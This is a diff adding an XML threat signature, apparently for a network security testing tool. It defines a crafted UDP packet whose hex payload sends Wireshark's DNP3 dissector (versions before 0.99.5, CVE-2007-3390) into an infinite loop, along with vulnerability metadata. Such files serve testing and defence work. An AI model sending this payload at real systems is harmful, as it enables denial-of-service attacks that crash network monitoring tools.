@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Wireshark &lt; 0.99.5 DNP3 Dissector Denial of Service Vulnerability"/>
+    <EngDesc display="true" value="This threat uses a specially crafted udp packet to exploit a flaw in the DNP3 protocol dissector for Wireshark causing an infinite loop, leading to a denial of service condition. This threat uses an arbitrary udp port."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="UDP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Wireshark"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Wireshark_Wireshark"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Wireshark_Wireshark_0.99.5"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/4347"/>
+    <CVEID display="true" value="CVE-2007-3390"/>
+    <bugtraqID display="true" value="24662"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="751bc4509662ab99dc2c2d4844075624"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633244696284218750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1189747473" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="DNP3destPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <UDP srcPort="@random(1026,65535)" destPort="$DNP3destPort" checksum="" length="" Payload="C3C00101000107080102030405060708"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Stateful display="false" value="false"/>
+  <DestIPVarName display="false" value="$destIP"/>
+</threatSignature>
